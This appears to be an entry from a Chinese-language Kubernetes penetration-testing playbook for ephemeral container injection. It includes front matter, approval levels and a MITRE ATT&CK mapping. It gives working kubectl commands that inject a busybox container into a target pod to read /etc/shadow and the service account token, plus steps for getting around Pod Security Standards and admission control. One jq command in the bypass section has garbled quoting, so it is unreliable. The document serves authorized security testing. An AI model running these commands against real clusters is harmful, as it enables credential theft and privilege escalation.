---
source: manual
confidence: medium
platforms: [k8s]
required_tools: []
execution_contexts: [L0, L1, L2]
max_verification_level: L2
destructive: false
mapped_attack_surfaces: [AS-2.6]
mapped_compliance_families: [Pod安全, RBAC配置]
---

# k8s-ephemeral-container — K8s Ephemeral Container 注入

攻击者拥有 `ephemeralcontainers` 权限的 ServiceAccount 或用户，可对目标 Pod 注入临时容器（Ephemeral Container），绕过 distroless 镜像无法 exec 的限制，在目标 Pod 内执行调试命令窃取数据。

---

## 1. 前置条件

- 当前 SA 或用户拥有 `pods/ephemeralcontainers` update 权限
- 目标 Pod 存在且无法通过常规 exec 进入（如 distroless 镜像无 shell）
- K8s 版本 ≥ 1.22（ephemeral containers GA 在 1.25）

检查命令：
```bash
# [L0] 检查当前身份是否有 ephemeralcontainers 权限
kubectl auth can-i create ephemeralcontainers
# 期望输出: yes

# [L0] 列出集群中所有 Pod
kubectl get pods --all-namespaces
# 期望输出: 目标 Pod 列表

# [L0] 确认 K8s 版本支持 ephemeral containers
kubectl version --short 2>/dev/null | grep Server
# 期望输出: Server Version: v1.25.x 或更高
```

## 2. 探测命令

```bash
# [L0] 确认当前权限全集
kubectl auth can-i --list 2>/dev/null | grep -iE 'ephemeral|debug'
# 期望输出: create pods/ephemeralcontainers yes

# [L0] 枚举目标 Pod 及其容器镜像
kubectl get pods --all-namespaces -o json | jq '.items[] | {name: .metadata.name, ns: .metadata.namespace, images: [.spec.containers[].image]}'
# 期望输出: 各 Pod 镜像列表（识别 distroless 镜像目标）

# [L0] 尝试确认目标 Pod 无法 exec（distroless 无 shell）
kubectl exec -n <target-ns> <target-pod> -- /bin/sh 2>&1
# 期望输出: OCI runtime exec failed: exec failed: container_linux.go:... no such file or directory
```

## 3. 攻击验证

```bash
# [L2] 通过 kubectl debug 注入临时容器到目标 Pod
kubectl debug -n <target-ns> <target-pod> --image=busybox --target=<container-name> -- /bin/sh -c "cat /etc/shadow"
# 期望输出: 通过 ephemeral container 读取目标容器文件系统

# [L2] 注入临时容器并共享目标容器 namespace
kubectl debug -n <target-ns> <target-pod> --image=busybox --target=<container-name> -- /bin/sh -c "ls /proc/1/root/"
# 期望输出: 目标容器根文件系统列表

# [L2] 在临时容器内读取目标容器的 SA token
kubectl debug -n <target-ns> <target-pod> --image=busybox --target=<container-name> -- /bin/sh -c "cat /proc/1/root/var/run/secrets/kubernetes.io/serviceaccount/token"
# 期望输出: JWT token 内容
```

## 4. 差分证明

```bash
# [L0] 攻击前：目标 Pod 容器列表
kubectl get pod -n <target-ns> <target-pod> -o jsonpath='{.spec.containers[*].name}'
# 期望输出: 原始容器名列表（不含 ephemeral 容器）

# [L2] debug 后：Pod 出现临时容器
kubectl get pod -n <target-ns> <target-pod> -o jsonpath='{.spec.ephemeralContainers[*].name}'
# 期望输出: 出现 debugger-xxxx 临时容器名 → 证明注入成功

# [L2] 临时容器内读取到目标容器文件系统内容
kubectl debug -n <target-ns> <target-pod> --image=busybox --target=<container-name> -- /bin/sh -c "cat /proc/1/root/etc/shadow"
# 期望输出: shadow 内容 → 证明临时容器已访问目标容器文件系统
```

差分结论：攻击前目标 Pod 仅有原始容器且无法 exec（distroless），攻击后通过 `ephemeralcontainers` 权限成功注入 busybox 临时容器并读取目标容器文件系统中的 `/etc/shadow` 与 SA token，证明 ephemeral container 注入可绕过 distroless 镜像的 exec 限制。

## 5. 绕过策略

```bash
# [L1] 检查 Pod Security Standards 是否禁止 ephemeral containers
kubectl get namespace <target-ns> -o json | jq '.metadata.labels."pod-security.kubernetes.io/\\\'"'"'enforce"'"'"'"'"''
# 若输出 restricted → 可能被 PSS 禁止

# [L1] 检查是否存在 AdmissionController 限制 ephemeral containers
kubectl get validatingwebhookconfiguration -o json | jq '.items[].webhooks[].rules[] | select(.resources[] | test("ephemeralcontainers"))'
# 若输出含 ephemeralcontainers 规则 → 可能被准入控制拦截

# 绕过方式：
# - [L1] 若 PSS 限制为 baseline，restricted 才会禁止，寻找 baseline/enforce 标签的命名空间
# - [L2] 若 ephemeral containers 被禁止但拥有 pods/exec 权限，回退到 exec 方案
# - [L2] 若 K8s 版本 < 1.25 但 >= 1.22，使用 alpha 特性门 --feature-gates=EphemeralContainers=true 验证
```

## 6. 证伪条件

```bash
# [L0] 无 ephemeralcontainers 权限
kubectl auth can-i create ephemeralcontainers
# 输出: no → 证伪

# [L0] K8s 版本低于 1.22（不支持 ephemeral containers）
kubectl version --short 2>/dev/null | grep Server
# 输出: Server Version: v1.21.x 或更低 → 证伪

# [L1] Pod Security Standards 强制 restricted 且生效
kubectl get namespace <target-ns> --show-labels | grep 'pod-security.kubernetes.io/enforce=restricted'
# 输出: 含 restricted 标签 → 该命名空间证伪
```

## 7. 审批级别

- **L2** ephemeral container 注入验证（向运行中 Pod 注入临时容器）→ **Level 3**（非破坏性临时容器注入，需人工确认）
- **L1** 探测命令 → **Level 2**（只读探测，自动执行）
- **L0** 宿主机观察命令 → **Level 1**（只读侦察，自动执行）
- 破坏性标注：否
- 最高验证层级：L2

## 8. MITRE ATT&CK

- **Tactic**: Execution
- **Technique ID**: T1059
- **Technique Name**: Command and Scripting Interpreter
- **描述**: 攻击者利用 K8s `ephemeralcontainers` 权限向目标 Pod 注入临时容器（如 busybox），在目标容器命名空间内执行命令，可绕过 distroless 镜像无 shell 的限制窃取敏感数据。